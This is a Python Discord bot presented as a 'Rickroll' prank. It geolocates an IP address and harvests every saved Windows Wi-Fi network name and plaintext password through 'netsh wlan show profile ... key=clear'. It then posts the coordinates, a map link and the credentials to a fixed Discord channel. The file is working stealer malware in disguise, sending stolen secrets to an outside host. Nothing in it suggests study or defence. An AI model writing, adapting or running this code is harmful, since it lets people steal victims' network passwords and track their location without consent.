import discord
import time
import datetime
import os
import ipinfo
from dotenv import load_dotenv
import subprocess
import re

client = None
load_dotenv()

API_KEY = os.getenv('API_KEY')

class MyClient(discord.Client):
        async def on_ready(self):
            print('Logged on as', self.user)
            channeln = self.get_channel(906776389749981197)
            ip_addr = os.getenv("IP_ADDR")
            ip_addr = ip_addr.split(",")[0]
            embed = discord.Embed(title="NEW",
                                 description="New person got RIckrolled!",
                                 timestamp=datetime.datetime.utcnow())
            embed.add_field(name="Ip Addr : ", value=ip_addr)
            handler = ipinfo.getHandler(API_KEY)
            details = handler.getDetails("183.82.26.165")
            la_response = str(details.loc).split(",")[0]
            lo_response = str(details.loc).split(",")[1]
            region = str(details.region)
            embed.add_field(name="Latitude", value=la_response)
            embed.add_field(name="Longittude", value=lo_response)
            embed.add_field(name="Region", value=region)
            map_url = f'https://www.google.com/maps/place/@{la_response},{lo_response}/'
            embed.add_field(name="Map URl", value=map_url)
            embed1 = discord.Embed(title="NEW",
                                 description="Wifi details!",
                                 timestamp=datetime.datetime.utcnow())
            passw = wifi()
            for i in range(len(passw)):
                embed1.add_field(name = str(passw[i]["ssid"]), value = passw[i]["password"])
            await channeln.send(embed=embed)
            await channeln.send(embed=embed1)
            time.sleep(1)
            await self.close()

def wifi():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
    wifi_list = []
    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = {}
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile) 
    
    return wifi_list

